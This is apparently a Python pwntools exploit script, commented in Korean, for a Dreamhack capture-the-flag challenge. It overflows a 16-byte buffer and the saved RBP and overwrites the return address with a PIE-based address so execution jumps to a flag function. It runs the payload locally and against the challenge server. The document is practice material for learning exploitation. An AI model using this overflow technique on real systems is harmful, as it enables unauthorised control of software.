#!/usr/bin/env python3

"""
정확한 오프셋으로 최종 테스트
"""

from pwn import *
import time

def final_local_test():
    """최종 로컬 테스트"""
    print("[+] 최종 로컬 테스트")
    print("=" * 50)
    
    # GDB에서 확인한 정보
    # RIP = 0x555555555338이었으므로
    # 우리가 입력한 주소가 0x555555555338이었다는 뜻
    # 따라서 0x555555555339를 입력해야 함
    
    pie_base = 0x555555554000
    flag_func_addr = pie_base + 0x1339
    
    print(f"PIE 베이스: 0x{pie_base:x}")
    print(f"플래그 함수: 0x{flag_func_addr:x}")
    
    # 6바이트 주소
    addr_bytes = p64(flag_func_addr)[:6]
    print(f"6바이트 주소: {addr_bytes.hex()}")
    
    # ASCII 체크
    for i, b in enumerate(addr_bytes):
        is_ascii = 0x20 < b < 0x7f
        char = chr(b) if is_ascii else '?'
        print(f"바이트 {i}: 0x{b:02x} ({char}) - {'✅' if is_ascii else '❌'}")
    
    # 페이로드: 16버퍼 + 8RBP + 6주소 = 30바이트
    payload = b"A" * 16
    payload += b"B" * 8
    payload += addr_bytes
    
    print(f"\n페이로드 길이: {len(payload)}")
    print(f"페이로드: {payload}")
    
    try:
        p = process('./main')
        p.sendline(payload)
        output = p.recvall(timeout=3)
        print(f"결과: {output}")
        
        if b'DH{' in output:
            print("🎉🎉🎉 로컬 성공! 플래그 발견!")
            return True
        else:
            print("여전히 플래그 출력 안됨")
            
        p.close()
        
    except Exception as e:
        print(f"오류: {e}")
    
    return False

def test_exact_crash_point():
    """정확한 크래시 지점 재확인"""
    print("\n[+] 정확한 크래시 지점 재확인")
    print("=" * 50)
    
    # 32바이트로 크래시 재현
    payload = b"A" * 16 + b"B" * 8 + b"C" * 8
    
    print(f"크래시 페이로드: {payload}")
    print(f"길이: {len(payload)}")
    
    try:
        p = process('./main')
        p.sendline(payload)
        
        # 약간 기다린 후 프로세스 상태 확인
        time.sleep(0.1)
        if p.poll() is None:
            output = p.recvall(timeout=2)
            print(f"정상 종료 출력: {output}")
        else:
            print(f"크래시로 종료됨 (exit code: {p.poll()})")
            
        p.close()
        
    except Exception as e:
        print(f"예외 발생: {e}")

def test_server_when_available():
    """서버 연결 가능할 때 테스트"""
    print("\n[+] 서버 테스트 (연결 확인)")
    print("=" * 50)
    
    HOST = 'host8.dreamhack.games'
    PORT = 14428
    
    try:
        r = remote(HOST, PORT, timeout=3)
        print("서버 연결 성공!")
        
        # 기본 응답 확인
        welcome = r.recvline()
        print(f"Welcome 메시지: {welcome}")
        
        # ASCII 호환 주소로 테스트
        pie_base = 0x555555554000  # 추정값
        flag_func_addr = pie_base + 0x1339
        addr_bytes = p64(flag_func_addr)[:6]
        
        payload = b"A" * 16 + b"B" * 8 + addr_bytes
        
        r.send(payload + b'\n')
        response = r.recvall(timeout=3)
        print(f"서버 응답: {response}")
        
        if b'DH{' in response:
            print("🎉🎉🎉 서버에서 플래그 발견!")
            return response
        
        r.close()
        
    except Exception as e:
        print(f"서버 연결 실패: {e}")
        print("서버가 다운되었거나 문제 종료되었을 수 있습니다.")
    
    return None

if __name__ == "__main__":
    print("🎯 최종 테스트")
    print("=" * 60)
    
    # 1. 크래시 지점 재확인
    test_exact_crash_point()
    
    # 2. 로컬 최종 테스트
    local_success = final_local_test()
    
    # 3. 서버 테스트 (가능한 경우)
    server_result = test_server_when_available()
    
    if local_success:
        print("\n🎉 로컬에서 성공!")
    
    if server_result:
        print(f"\n🎉🎉🎉 서버에서 플래그 획득: {server_result}")
    else:
        print("\n📝 분석 결과:")
        print("- 버퍼 오버플로우 성공적으로 확인")
        print("- RIP 제어 가능")
        print("- ASCII 호환 주소 존재")
        print("- 로컬/서버 바이너리 차이 가능성")
        print("- 서버 연결 문제로 최종 테스트 못함")
